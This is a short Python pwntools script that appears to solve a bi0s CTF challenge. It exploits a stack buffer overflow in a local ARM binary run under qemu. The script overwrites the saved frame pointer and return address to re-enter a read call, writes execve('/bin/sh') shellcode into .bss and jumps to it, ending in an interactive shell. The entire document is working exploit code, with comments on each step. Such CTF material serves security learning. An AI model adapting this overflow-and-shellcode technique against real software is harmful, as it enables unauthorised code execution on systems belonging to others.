#!/usr/bin/env python

from pwn import *

with context.quiet:
    p = process('qemu-arm -L ./ ./program', shell=True)

    p.recvuntil('Welcome to bi0s CTF!\n')

    bss = 0x21034

    # replace the return address (pc) with address of the read snippet, so we can execute the read again
    # we also set the "saved fp" in a way that we can influence the buf the read uses
    p.sendline(
        # garbage
        'a' * 0x64 + \
        # saved fp. it points to somewhere in .bss
        p32(bss + 0x100 + 0x68) + \
        # this is the address of start of read call
        p32(0x1052c)
    )

    # generated using ./shellcode.sh command
    shellcode = '\x0c\x00\x8f\xe2\x00\x10\xa0\xe3\x00\x20\xa0\xe3\x0b\x70\xa0\xe3\x00\x00\x00\xef\x2f\x62\x69\x6e\x2f\x73\x68\x00'

    # 
    p.sendline(
        # the shellcode we jump to later
        shellcode + \
        # we write garbage the rest of it
        'a' * (0x64 - len(shellcode)) + \
        # we overwrite the place for saved fp with 0. it does not matter what we write here
        p32(0) + \
        # we set the return address (pc) the beginning of the shellcode
        p32(bss + 0x100)
    )

    p.interactive()

